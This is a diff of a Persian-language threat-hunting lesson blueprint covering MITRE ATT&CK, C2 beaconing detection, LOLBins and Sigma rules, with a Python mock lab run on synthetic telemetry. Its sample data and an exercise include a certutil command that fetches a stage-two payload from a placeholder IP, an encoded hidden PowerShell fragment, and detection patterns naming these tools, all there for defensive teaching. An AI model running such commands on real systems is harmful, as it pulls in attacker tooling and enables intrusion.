@@ -1,341 +1,341 @@
 {
- "schema": "fam-app-blueprint-v1",
- "lessonId": "spec_cyber_hunt",
- "objectiveId": "spec_cyber_hunt",
- "kind": "lesson",
- "track": "Specialist",
- "course": "spec-cyberops",
- "title": "۷.۷ CyberOps: شکار پیش‌فعال تهدید (Threat Hunting)، ماتریس MITRE ATT&CK، تله‌متری و شکار LOLBins",
- "titleEn": "CyberOps Deep Dive: Proactive Threat Hunting, MITRE ATT&CK, Pyramid of Pain, C2 Beaconing & LOLBins",
- "domain": "Cybersecurity Operations",
- "source": "Legacy spec_cyber_hunt rewritten, fully typo-cleaned, and audited",
- "evidence": "Designed — Not Run",
- "reviewStatus": "بازبینی معنایی توسط نویسنده انجام شده؛ بازبینی مستقل انجام نشده است",
- "estimatedMinutes": 55,
- "prerequisites": [
-  "spec_cyber"
- ],
- "sections": [
-  {
-   "id": "spec_cyber_hunt-section-1",
-   "title": "مسئله واقعی: اگر هیچ هشداری در SIEM روشن نشده، آیا واقعاً امن هستید؟",
-   "html": "<p>مهاجمان پیشرفته (APT) و گروه‌های باج‌افزاری مدرن دیگر فایل‌های مخرب ساده با هش شناخته‌شده روی دیسک نمی‌ریزند تا آنتی‌ویروس یا SIEM آژیر بکشد! آن‌ها هفته‌ها بی‌سروصدا با ابزارهای مشروع خود ویندوز و لینوکس (<strong>LOLBins</strong> مثل PowerShell، WMI و Certutil) درون شبکه حرکت جانبی (Lateral Movement) می‌کنند. <strong>شکار تهدید (Proactive Threat Hunting)</strong> یعنی منتظر هشدار نمانیم: با ذهنیت <strong>«فرض کن نفوذ رخ داده (Assume Breach)»</strong> و بر پایه فرضیه (Hypothesis)، در دل لاگ‌های Endpoint و شبکه به دنبال ردپای رفتارهای مهاجم (TTPs) بگردیم!</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-2",
-   "title": "هدف یادگیری و پیش‌نیازها",
-   "html": "<p><strong>پیش‌نیازها:</strong> مبانی SOC، SIEM، تحلیل لاگ و پاسخ به رخداد در درس <code>spec_cyber</code>.</p><ul><li>اجرای چرخه ۴مرحله‌ای <strong>Hypothesis-Driven Threat Hunting</strong> و تبدیل یافته‌های شکار به قوانین پایدار <strong>Sigma / YARA / SIEM</strong>.</li><li>به‌کارگیری <strong>هرم درد (Pyramid of Pain)</strong> و ماتریس <strong>MITRE ATT&amp;CK</strong> برای هدف‌گیری <strong>TTPs</strong> به جای وابستگی صرف به هش و IP.</li><li>شناسایی تکنیک‌های پنهان‌کاری مهاجمان: <strong>C2 Beaconing</strong> (فواصل زمانی منظم کم‌جیتر در شبکه)، <strong>DNS Tunneling</strong> و <strong>LOLBins</strong> (PowerShell کدگذاری‌شده، <code>certutil</code>، <code>mshta</code>).</li><li>ترکیب تله‌متری شبکه (<strong>Zeek / NetFlow / DNS</strong>) با تله‌متری میزبان (<strong>Sysmon / EDR Process Tree</strong>) و مهار هشدارهای کاذب (False Positives).</li></ul>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-3",
-   "title": "تفاوت پایش واکنشی (Alert Triage) با شکار پیش‌فعال تهدید (Proactive Hunting)",
-   "html": "<table><thead><tr><th>ویژگی</th><th>پایش واکنشی SOC (Tier 1/2 Alerting)</th><th>شکار پیش‌فعال تهدید (Threat Hunting)</th></tr></thead><tbody><tr><td>نقطه شروع</td><td>یک هشدار (Alert) از SIEM/EDR/IDS</td><td><strong>فرضیه (Hypothesis)</strong> مبتنی بر تهدیدات روز و ATT&amp;CK</td></tr><tr><td>ابزار تمرکز</td><td>قوانین موجود و IOCهای شناخته‌شده</td><td>کاوش داده‌های خام (Sysmon، Zeek، NetFlow، DNS) و تحلیل آماری</td></tr><tr><td>خروجی نهایی</td><td>بستن یا ارجاع یک تیکت رخداد</td><td>کشف نفوذ ناشناخته + <strong>ساخت قاعده تشخیص خودکار جدید (Detection Engineering)</strong> + رفع شکاف دید (Visibility Gap)</td></tr></tbody></table>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-4",
-   "title": "نمودار چرخه شکار پیش‌فعال تهدید و هرم درد (Pyramid of Pain)",
-   "html": "<p>نمودار زیر چهار گام چرخه Threat Hunting و جایگاه TTPها در قله هرم درد دیوید بیانکو را نشان می‌دهد.</p><svg viewBox=\"0 0 760 225\" xmlns=\"http://www.w3.org/2000/svg\" role=\"img\" aria-label=\"Proactive Threat Hunting Loop: Hypothesis, MITRE ATT&amp;CK, Telemetry (Sysmon/Zeek/EDR), Beaconing &amp; Detection Engineering\"><rect x=\"14\" y=\"16\" width=\"170\" height=\"106\" rx=\"10\" fill=\"#eff6ff\" stroke=\"#1d4ed8\" stroke-width=\"2\"/><text x=\"99\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#1e3a8a\">1. Hypothesis</text><text x=\"99\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#0f172a\">Assume Breach Mindset</text><text x=\"99\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#1e40af\">MITRE ATT&amp;CK TTPs</text><text x=\"99\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#1e40af\">e.g. T1059.001 / T1071</text><rect x=\"200\" y=\"16\" width=\"174\" height=\"106\" rx=\"10\" fill=\"#fef3c7\" stroke=\"#d97706\" stroke-width=\"2\"/><text x=\"287\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#92400e\">2. Telemetry Hunt</text><text x=\"287\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#78350f\">Sysmon / EDR Process Tree</text><text x=\"287\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#b45309\">Zeek / NetFlow / DNS Logs</text><text x=\"287\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#78350f\">C2 Beaconing &amp; LOLBins</text><rect x=\"390\" y=\"16\" width=\"172\" height=\"106\" rx=\"10\" fill=\"#fee2e2\" stroke=\"#b91c1c\" stroke-width=\"2\"/><text x=\"476\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#991b1b\">3. Uncover &amp; Triage</text><text x=\"476\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#7f1d1d\">Low-Jitter C2 Pattern</text><text x=\"476\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#991b1b\">Encoded PowerShell / Certutil</text><text x=\"476\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#7f1d1d\">Filter Benign Admin Noise</text><rect x=\"578\" y=\"16\" width=\"168\" height=\"106\" rx=\"10\" fill=\"#dcfce7\" stroke=\"#15803d\" stroke-width=\"2\"/><text x=\"662\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#166534\">4. Automate Rule</text><text x=\"662\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#14532d\">Convert Hunt -&gt; Sigma/YARA</text><text x=\"662\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#166534\">Feed SIEM &amp; SOAR Playbook</text><text x=\"662\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#14532d\">Close Visibility Gaps!</text><rect x=\"14\" y=\"144\" width=\"732\" height=\"64\" rx=\"10\" fill=\"#f8fafc\" stroke=\"#475569\" stroke-width=\"2\"/><text x=\"380\" y=\"168\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#0f172a\">Pyramid of Pain: Hashes/IPs (Trivial to Change) &lt; Domains &lt; Tools &lt; TTPs (Tough for Attackers!)</text><text x=\"380\" y=\"188\" text-anchor=\"middle\" font-size=\"9\" fill=\"#334155\">Mature Threat Hunters Hunt Top-of-Pyramid TTPs (MITRE ATT&amp;CK), Not Only Yesterday&apos;s MD5 Hashes!</text></svg>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-5",
-   "title": "هرم درد (Pyramid of Pain) و ماتریس MITRE ATT&CK: چرا شکارچی حرفه‌ای بالای هرم شکار می‌کند؟",
-   "html": "<p>در <strong>هرم درد (David Bianco)</strong>، اگر مدافع فقط یک <strong>Hash</strong> (پایین هرم) یا <strong>آدرس IP</strong> را مسدود کند، مهاجم ظرف ۱۰ ثانیه فایل را با یک بایت اضافه تغییر می‌دهد یا سرور ابری جدید می‌گیرد! اما اگر مدافع رفتار و تکنیک مهاجم (<strong>TTPs — قله هرم</strong>) مانند «اجرای PowerShell مخفی از زیرشاخه <code>winword.exe</code>» یا «استفاده از <code>certutil -urlcache</code> برای دانلود فایل» را بر اساس کدهای <strong>MITRE ATT&amp;CK</strong> (مثل <code>T1059.001</code> و <code>T1105</code>) شکار کند، مهاجم مجبور به بازنویسی کل روش عملیات خود می‌شود!</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-6",
-   "title": "شکار در تله‌متری شبکه: کشف C2 Beaconing، آنتروپی DNS و تحلیل Zeek/NetFlow",
-   "html": "<ul><li><strong>C2 Beaconing (تپش فرمان و کنترل):</strong> بدافزارها (مثل Cobalt Strike یا Sliver) در بازه‌های منظم (مثلاً هر ۶۰ ثانیه با کمی Jitter تصادفی) به سرور C2 سر می‌زنند. تحلیل آماری فاصله زمانی اتصال‌ها (میانگین و نسبت انحراف معیار به میانگین — <strong>Low Jitter Ratio</strong>) روی لاگ‌های Proxy، NetFlow یا <strong>Zeek (<code>conn.log / http.log / tls.log</code>)</strong> حتی زمانی که ترافیک با HTTPS رمزنگاری شده، الگوی Beaconing را افشا می‌کند!</li><li><strong>DNS Tunneling و DGA:</strong> زیردامنه‌های بسیار طولانی با آنتروپی (تصادفی بودن حروف) بالا و حجم غیرعادی درخواست‌های <code>TXT / AAAA</code> به یک دامنه تازه ثبت‌شده، نشانه کلاسیک خروج داده (Exfiltration) از طریق DNS است.</li></ul>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-7",
-   "title": "شکار در تله‌متری میزبان: Sysmon، درخت فرآیندها (Parent-Child) و LOLBins",
-   "html": "<p>در ویندوز، لاگ‌های پیش‌فرض اغلب برای شکار کافی نیستند؛ فعال‌سازی <strong>Microsoft Sysmon</strong> (به ویژه رویداد <code>Event ID 1: Process Creation</code> با خط فرمان کامل، <code>Event ID 3: Network Connection</code> و <code>Event ID 11: FileCreate</code>) همراه با <strong>PowerShell Script Block Logging (4104)</strong> دید فوق‌العاده‌ای می‌دهد. دو الگوی طلایی شکار:</p><ul><li><strong>روابط غیرطبیعی والد-فرزند (Parent-Child Process Anomaly):</strong> چرا باید <code>winword.exe</code> یا <code>excel.exe</code> فرآیند <code>cmd.exe</code> یا <code>powershell.exe -EncodedCommand</code> را باز کند؟! یا چرا باید <code>w3wp.exe</code> (وب‌سرور IIS) دستور <code>whoami</code> اجرا کند (نشانه Web Shell)!</li><li><strong>سوءاستفاده از LOLBins (Living off the Land Binaries):</strong> استفاده مهاجم از ابزارهای مشروع و امضاشده خود ویندوز مانند <code>certutil.exe -urlcache -f</code>، <code>bitsadmin</code>، <code>mshta</code> یا <code>rundll32</code> برای دور زدن فهرست سفید نرم‌افزارها.</li></ul>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-8",
-   "title": "تبدیل شکار موفق به مهندسی تشخیص پایدار: Sigma، YARA و Playbookهای SOAR",
-   "html": "<p>اگر یک شکارچی هفته‌ای یک بار همان کوئری را دستی اجرا کند، شکار مقیاس نمی‌گیرد! گام چهارم و طلایی چرخه شکار، <strong>تبدیل فرضیه موفق به قاعده تشخیص خودکار (Detection Engineering)</strong> است: نوشتن قانون عمومی لاگ با قالب باز <strong>Sigma</strong> (قابل تبدیل به Splunk، Elastic، Sentinel)، نوشتن امضای فایل/حافظه با <strong>YARA</strong> و اتصال آن به Playbook قرنطینه خودکار <strong>SOAR / ISE ANC</strong> تا دفعه بعد SIEM آن را در ثانیه اول شکار کند و شکارچی به سراغ فرضیه جدیدتر برود!</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-9",
-   "title": "مهار هشدارهای کاذب (False Positives) و شناخت Baseline عادی سازمان",
-   "html": "<p>بزرگ‌ترین قاتل موفقیت تیم شکار، ندانستن رفتار عادی (<strong>Baseline</strong>) سازمان است! بسیاری از ابزارهای مدیریت سیستم (SCCM، Ansible، اسکریپت‌های بکاپ <code>robocopy</code> یا مانیتورینگ) نیز اتصال‌های منظم یا اسکریپت‌های PowerShell اجرا می‌کنند. شکارچی حرفه‌ای با روش <strong>Stacking (شمارش فراوانی و بررسی کم‌تکرارترین موارد — Long-Tail Analysis)</strong> موارد نادر و مشکوک را از نویز عادی مدیران جدا می‌کند.</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-10",
-   "title": "تفاوت‌های کلیدی Cyber Kill Chain، مدل Diamond و ماتریس MITRE ATT&CK",
-   "html": "<p>هر سه چارچوب مکمل هم‌اند: <strong>Cyber Kill Chain</strong> مراحل خطی حمله بیرونی (از Reconnaissance تا Actions on Objectives) را نشان می‌دهد، <strong>Diamond Model</strong> رابطه میان مهاجم، زیرساخت، قابلیت و قربانی را تحلیل می‌کند، و <strong>MITRE ATT&amp;CK</strong> دانشنامه عمیق و جزئی رفتارهای پس از نفوذ (Post-Exploitation) در قالب ۱۴ تاکتیک و صدها تکنیک و زیرتکنیک است که زبان مشترک تیم‌های Threat Hunting و Red/Blue Team محسوب می‌شود.</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-11",
-   "title": "کژفهمی‌های رایج درباره Threat Hunting",
-   "html": "<ul><li><strong>کژفهمی ۱: «اگر شکار تمام شد و هیچ بدافزاری پیدا نکردیم، پس شکار شکست خورده است!»</strong> واقعیت: خیر! یک شکار بدون کشف نفوذ اغلب شکاف‌های لاگ‌برداری (Visibility Gaps — مثلاً خاموش بودن Sysmon روی سرورهای حیاتی) را کشف می‌کند، Baseline سازمان را می‌سازد و برای کل تیم قاعده جدید تولید می‌کند.</li><li><strong>کژفهمی ۲: «جست‌وجوی فهرست ۱۰۰ آدرس IP مخرب در SIEM همان Threat Hunting پیشرفته است.»</strong> واقعیت: جست‌وجوی ساده IOCها (پایین هرم درد) باید کاملاً خودکار در SIEM انجام شود؛ Threat Hunting واقعی مبتنی بر فرضیه و شکار رفتارها/TTPهاست.</li><li><strong>کژفهمی ۳: «چون ترافیک C2 با HTTPS رمزنگاری شده، از شبکه هیچ کاری نمی‌شود کرد.»</strong> واقعیت: حتی بدون شکستن TLS، فراداده‌هایی مانند الگوی زمانی Beaconing، اثر انگشت TLS (JA3/JA4)، نام دامنه SNI، گواهینامه Self-Signed و نسبت حجم ارسال/دریافت، C2 را لو می‌دهند!</li></ul>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-12",
-   "title": "اصلاح اشتباهات نگارشی نسخه قدیمی و چک‌لیست اجرای شکار سالم",
-   "html": "<p><strong>یادداشت ممیزی کیفیت محتوا:</strong> در نسخه قدیمی این درس چندین عبارت به هم ریخته و نادرست تایپی وجود داشت که در این نسخه به‌طور کامل بازنویسی و با اصطلاحات دقیق بین‌المللی (<code>MITRE ATT&amp;CK</code>، <code>C2 Beaconing</code>، <code>LOLBins</code>، <code>Sysmon</code>، <code>Zeek</code> و <code>Sigma/YARA</code>) جایگزین شده‌اند.</p><p><strong>چک‌لیست شروع یک شکار:</strong> (۱) نوشتن فرضیه دقیق با شناسه ATT&amp;CK، (۲) تأیید موجود بودن تله‌متری لازم (Sysmon/Zeek/DNS)، (۳) اجرای تحلیل Stacking / Jitter، (۴) مستندسازی یافته‌ها و تبدیل به قانون Sigma.</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-13",
-   "title": "تمرین تحلیلی با پاسخ تشریحی",
-   "html": "<p><strong>تمرین ۱:</strong> ایستگاه کاری <code>10.10.40.19</code> هر ۶۰ ثانیه (با فواصل ۵۸ تا ۶۲ ثانیه، نسبت جیتر <code>0.022</code>) به یک سرور خارجی متصل می‌شود، در حالی که کاربر <code>10.10.40.22</code> فواصل کاملاً نامنظم (۱۴ تا ۴۷۵ ثانیه، جیتر <code>1.07</code>) دارد. کدام مورد مشکوک به C2 Beaconing است؟ <strong>پاسخ:</strong> ایستگاه <code>10.10.40.19</code> به دلیل تناوب شدید و جیتر بسیار پایین، نامزد قوی شکار برای <code>MITRE ATT&amp;CK T1071 (C2 Beaconing)</code> است.</p><p><strong>تمرین ۲:</strong> در لاگ Sysmon روی یک ایستگاه مالی دستور <code>certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin</code> دیده شده است. این رفتار به چه تکنیکی تعلق دارد؟ <strong>پاسخ:</strong> سوءاستفاده از ابزار مشروع ویندوز (<strong>LOLBin</strong>) برای دانلود ابزار مهاجم؛ مطابق با <strong><code>MITRE ATT&amp;CK T1105 (Ingress Tool Transfer)</code></strong>.</p>"
-  },
-  {
-   "id": "spec_cyber_hunt-section-14",
-   "title": "منابع فنی، محدودیت‌ها و مرز اجرا",
-   "html": "<p><strong>منابع مرجع:</strong> <a href=\"https://attack.mitre.org/\" target=\"_blank\" rel=\"noopener\">ماتریس رسمی MITRE ATT&amp;CK</a> و <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\">مستندات رسمی Microsoft Sysmon</a>.</p><p><strong>محدودیت‌ها و مرز اجرا:</strong> آزمایشگاه این درس یک Local Mock در Python 3 روی تله‌متری مصنوعی است و هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای در این محیط اجرا نشده است.</p>"
-  }
- ],
- "glossary": [
-  {
-   "term": "Threat Hunting",
-   "fa": "شکار پیش‌فعال تهدید",
-   "simple": "جست‌وجوی هدفمند و فرضیه‌محور در لاگ‌ها و تله‌متری شبکه برای کشف مهاجمانی که از لایه‌های هشدار عبور کرده‌اند."
-  },
-  {
-   "term": "Assume Breach",
-   "fa": "ذهنیت فرض وقوع نفوذ",
-   "simple": "اصل بنیادین شکار تهدید مبنی بر اینکه نباید نبود هشدار را مساوی با نبود مهاجم دانست."
-  },
-  {
-   "term": "MITRE ATT&CK",
-   "fa": "ماتریس تاکتیک‌ها و تکنیک‌های مهاجمان",
-   "simple": "پایگاه دانش جهانی رفتارهای واقعی مهاجمان (تاکتیک‌ها، تکنیک‌ها و زیرتکنیک‌ها)."
-  },
-  {
-   "term": "Pyramid of Pain",
-   "fa": "هرم درد دیوید بیانکو",
-   "simple": "رتبه‌بندی دشواری تغییر شاخص‌ها برای مهاجم: از هش و IP (آسان) تا TTPها در قله (بسیار دشوار)."
-  },
-  {
-   "term": "TTPs",
-   "fa": "تاکتیک‌ها، تکنیک‌ها و رویه‌ها",
-   "simple": "الگوهای رفتاری مهاجم (بالای هرم درد)؛ پایدارترین و ارزشمندترین هدف برای شکار و تشخیص."
-  },
-  {
-   "term": "C2 Beaconing",
-   "fa": "تپش ارتباط فرمان و کنترل",
-   "simple": "اتصال‌های دوره‌ای و کم‌جیتر بدافزار به سرور فرمان‌دهی مهاجم (قابل کشف با تحلیل آماری فواصل)."
-  },
-  {
-   "term": "LOLBins",
-   "fa": "ابزارهای مشروع مورد سوءاستفاده",
-   "simple": "Living off the Land Binaries؛ ابزارهای امضاشده خود سیستم‌عامل (PowerShell، certutil، mshta) که مهاجم به کار می‌برد."
-  },
-  {
-   "term": "Microsoft Sysmon",
-   "fa": "مانیتور پیشرفته رویداد ویندوز",
-   "simple": "سرویس رایگان مایکروسافت برای ثبت دقیق ساخت فرآیند با خط فرمان (EID 1)، اتصال شبکه (EID 3) و فایل‌ها."
-  },
-  {
-   "term": "Zeek (Bro)",
-   "fa": "تحلیلگر فراداده شبکه",
-   "simple": "موتور متن‌باز تولید لاگ‌های غنی شبکه (conn، dns، http، tls) برای شکار تهدید بدون ذخیره تمام PCAP."
-  },
-  {
-   "term": "Sigma Rules",
-   "fa": "قالب استاندارد قوانین SIEM",
-   "simple": "زبان متنی YAML مستقل از فروشنده برای نوشتن قوانین تشخیص لاگ و تبدیل آن به Splunk/Elastic/Sentinel."
-  },
-  {
-   "term": "YARA",
-   "fa": "زبان امضای فایل و حافظه",
-   "simple": "استاندارد شناسایی الگوهای باینری یا متنی خانواده‌های بدافزار روی دیسک و رم."
-  },
-  {
-   "term": "Long-Tail Stacking",
-   "fa": "تحلیل فراوانی کم‌تکرارها",
-   "simple": "تکنیک آماری شکار برای یافتن فرآیندها یا دامنه‌های نادر (Outliers) در میان حجم انبوه فعالیت عادی."
-  },
-  {
-   "term": "DNS Tunneling",
-   "fa": "تونل‌زنی روی DNS",
-   "simple": "خروج مخفیانه داده یا ارتباط C2 درون زیردامنه‌های طولانی و پرآنتروپی DNS."
-  },
-  {
-   "term": "Visibility Gap",
-   "fa": "شکاف دید تله‌متری",
-   "simple": "نبود لاگ یا حسگر لازم (مثل خاموش بودن Script Block Logging) که مانع تأیید یا رد یک فرضیه شکار می‌شود."
-  },
-  {
-   "term": "Detection Engineering",
-   "fa": "مهندسی قواعد تشخیص",
-   "simple": "تبدیل یافته‌های موفق Threat Hunting به قوانین خودکار، کم‌خطا و قابل آزمون در SIEM/EDR."
-  }
- ],
- "stages": {
-  "lab": {
-   "title": "آزمایشگاه شبیه‌سازی محلی Python (کشف C2 Beaconing کم‌جیتر و شکار PowerShell/certutil LOLBins با نگاشت MITRE ATT&CK) — بدون SIEM یا بدافزار واقعی",
-   "executionStatus": "اسکریپت شبیه‌سازی محلی (Local Mock) با Python 3 روی تله‌متری مصنوعی اجرا و تست شده؛ هیچ SIEM/EDR یا بدافزار واقعی متصل یا اجرا نشده است.",
-   "html": "<p><strong>وضعیت اجرای آزمایشگاه:</strong> بخش اول یک <strong>شبیه‌سازی محلی (Local Mock) در Python 3</strong> است که در محیط Python 3 اجرا و با تست خودکار بررسی شده است؛ بخش دوم یک <strong>سناریوی مرجع طراحی‌شده (اجرا نشده روی تجهیز واقعی)</strong> است. هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای در این محیط اجرا یا متصل نشده است.</p><p>این شبیه‌ساز محلی دو الگوریتم واقعی شکار تهدید را روی تله‌متری مصنوعی اجرا می‌کند: (۱) محاسبه نسبت جیتر (<code>stdev / mean</code>) برای تفکیک <strong>C2 Beaconing</strong> منظم از ترافیک عادی کاربر، و (۲) شکار خط فرمان <strong>PowerShell EncodedCommand (T1059.001)</strong> و <strong>certutil LOLBin (T1105)</strong> درون رویدادهای Sysmon همراه با فیلتر فعالیت مشروع <code>robocopy</code>.</p><h4>بخش ۱: اجرای کد آزمایشگاه محلی</h4><p>پیش‌نیاز: Python 3.10+. کد زیر دقیقاً همان فایل <code>academy-labs/agent3/spec_cyber_hunt_lab.py</code> است؛ آن را با دستور زیر اجرا کنید:</p><pre dir=\"ltr\"><code>python3 01-خام-پروژه/academy-labs/agent3/spec_cyber_hunt_lab.py</code></pre><pre dir=\"ltr\"><code>#!/usr/bin/env python3\n&quot;&quot;&quot;\nLocal Mock Lab — spec_cyber_hunt (CyberOps Proactive Threat Hunting: MITRE ATT&amp;CK, C2 Beaconing &amp; LOLBins)\nSimulates hypothesis-driven threat hunting over synthetic Sysmon + DNS telemetry to detect:\n1) Periodic C2 HTTP/DNS beaconing (sorted inter-arrival CV with &gt;=4 observations minimum guard),\n2) Suspicious PowerShell encoded command + LOLBin (certutil) download,\n3) Mapping detections to MITRE ATT&amp;CK Tactics/Techniques while suppressing benign admin activity.\nNo real SIEM, EDR, Zeek sensor, or live malware is executed.\n&quot;&quot;&quot;\n\nimport json\nimport statistics\n\n\ndef detect_beaconing(timestamps_sec: list[int], max_jitter_ratio: float = 0.08) -&gt; dict:\n    if len(timestamps_sec) &lt; 4:\n        return {\n            &quot;intervals_sec&quot;: [],\n            &quot;mean_interval_sec&quot;: 0.0,\n            &quot;jitter_ratio&quot;: None,\n            &quot;beaconing_suspected&quot;: False,\n            &quot;reason&quot;: &quot;Need at least 4 observations to assess periodic beaconing&quot;,\n            &quot;mitre_attack&quot;: None,\n        }\n    ordered = sorted(timestamps_sec)\n    deltas = [b - a for a, b in zip(ordered, ordered[1:])]\n    mean_d = statistics.mean(deltas)\n    stdev_d = statistics.pstdev(deltas)\n    if mean_d &lt;= 0:\n        return {\n            &quot;intervals_sec&quot;: deltas,\n            &quot;mean_interval_sec&quot;: 0.0,\n            &quot;jitter_ratio&quot;: None,\n            &quot;beaconing_suspected&quot;: False,\n            &quot;reason&quot;: &quot;Non-positive mean inter-arrival interval&quot;,\n            &quot;mitre_attack&quot;: None,\n        }\n    jitter_ratio = round(stdev_d / mean_d, 4)\n    suspected = jitter_ratio &lt;= max_jitter_ratio\n    return {\n        &quot;intervals_sec&quot;: deltas,\n        &quot;mean_interval_sec&quot;: round(mean_d, 2),\n        &quot;jitter_ratio&quot;: jitter_ratio,\n        &quot;beaconing_suspected&quot;: suspected,\n        &quot;mitre_attack&quot;: &quot;T1071.001 / TA0011 (Command and Control)&quot; if suspected else None,\n    }\n\n\ndef hunt_sysmon_events(events: list[dict]) -&gt; list[dict]:\n    findings = []\n    for ev in events:\n        cmd = ev[&quot;command_line&quot;].lower()\n        if &quot;powershell&quot; in cmd and (&quot;-enc&quot; in cmd or &quot;-encodedcommand&quot; in cmd):\n            findings.append({\n                &quot;host&quot;: ev[&quot;host&quot;],\n                &quot;process&quot;: ev[&quot;process&quot;],\n                &quot;severity&quot;: &quot;HIGH&quot;,\n                &quot;hypothesis&quot;: &quot;Obfuscated PowerShell Execution&quot;,\n                &quot;mitre_tactic&quot;: &quot;TA0002 Execution&quot;,\n                &quot;mitre_technique&quot;: &quot;T1059.001 (PowerShell)&quot;,\n            })\n        elif &quot;certutil&quot; in cmd and &quot;-urlcache&quot; in cmd:\n            findings.append({\n                &quot;host&quot;: ev[&quot;host&quot;],\n                &quot;process&quot;: ev[&quot;process&quot;],\n                &quot;severity&quot;: &quot;HIGH&quot;,\n                &quot;hypothesis&quot;: &quot;LOLBin Ingress Tool Transfer via certutil&quot;,\n                &quot;mitre_tactic&quot;: &quot;TA0011 Command and Control&quot;,\n                &quot;mitre_technique&quot;: &quot;T1105 (Ingress Tool Transfer)&quot;,\n            })\n    return findings\n\n\ndef main() -&gt; None:\n    c2_beacon_times = [300, 0, 180, 60, 361, 121, 242]  # Intentionally unsorted raw log order\n    normal_browsing_times = [0, 14, 180, 195, 620, 625, 1100]\n    too_few_samples = [0, 60]\n    sysmon_logs = [\n        {&quot;host&quot;: &quot;WKSTN-FIN-09&quot;, &quot;process&quot;: &quot;powershell.exe&quot;, &quot;command_line&quot;: &quot;powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA...&quot;},\n        {&quot;host&quot;: &quot;WKSTN-FIN-09&quot;, &quot;process&quot;: &quot;certutil.exe&quot;, &quot;command_line&quot;: &quot;certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin&quot;},\n        {&quot;host&quot;: &quot;SRV-BACKUP-01&quot;, &quot;process&quot;: &quot;robocopy.exe&quot;, &quot;command_line&quot;: &quot;robocopy D:\\\\Data \\\\\\\\NAS01\\\\Backup /MIR&quot;},\n    ]\n    c2_res = detect_beaconing(c2_beacon_times)\n    benign_res = detect_beaconing(normal_browsing_times)\n    few_res = detect_beaconing(too_few_samples)\n    sysmon_hits = hunt_sysmon_events(sysmon_logs)\n\n    assert c2_res[&quot;beaconing_suspected&quot;] is True\n    assert benign_res[&quot;beaconing_suspected&quot;] is False\n    assert few_res[&quot;beaconing_suspected&quot;] is False\n    assert len(sysmon_hits) == 2\n\n    report = {\n        &quot;mode&quot;: &quot;LOCAL_MOCK_NO_REAL_SIEM_EDR_OR_MALWARE&quot;,\n        &quot;c2_beaconing_analysis&quot;: {\n            &quot;suspicious_host_10_10_40_19_unsorted_logs&quot;: c2_res,\n            &quot;benign_user_10_10_40_22&quot;: benign_res,\n            &quot;insufficient_samples_guard&quot;: few_res,\n        },\n        &quot;sysmon_lolbin_findings&quot;: sysmon_hits,\n        &quot;benign_events_filtered&quot;: len(sysmon_logs) - len(sysmon_hits),\n    }\n    print(json.dumps(report, indent=2, ensure_ascii=False))\n\n\nif __name__ == &quot;__main__&quot;:\n    main()\n</code></pre><p><strong>خروجی مورد انتظار:</strong> شناسایی <code>suspicious_host_10_10_40_19</code> با <code>jitter_ratio: 0.0223</code> (مشکوک به T1071.001)، دو یافته <code>HIGH</code> روی <code>WKSTN-FIN-09</code> و فیلتر ۱ رویداد مشروع بکاپ.</p><h4>بخش ۲: سناریوی مرجع طراحی‌شده (تجهیز واقعی اجرا نشده)</h4><p><strong>الگوی مرجع قانون Sigma برای شکار certutil LOLBin (اجرا نشده روی SIEM زنده):</strong></p><pre dir=\"ltr\"><code># Reference Sigma detection rule (NOT deployed to live SIEM)\ntitle: Suspicious Certutil URLCache Download (T1105)\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \"\\\\certutil.exe\"\n    CommandLine|contains|all: [\"-urlcache\", \"-f\"]\n  condition: selection\nlevel: high</code></pre><p><strong>مرز شواهد:</strong> اجرای کد محلی فقط بخش مدل‌شده/محلی را می‌آزماید و جایگزین آزمایش روی سخت‌افزار شبکه یا سامانه تولیدی نیست.</p>"
-  },
-  "quiz": {
-   "title": "آزمون درس شکار پیش‌فعال تهدید (Threat Hunting)، MITRE ATT&CK و LOLBins",
-   "instructions": "پاسخ هر ۱۲ پرسش را انتخاب کرده و توضیح فنی گزینه‌ها را بررسی کنید."
-  }
- },
- "interactiveQuiz": [
-  {
-   "title": "بنیادی‌ترین تفاوت شکار پیش‌فعال تهدید (Threat Hunting) با پایش واکنشی سنتی SOC (Alert Triage) چیست؟",
-   "options": [
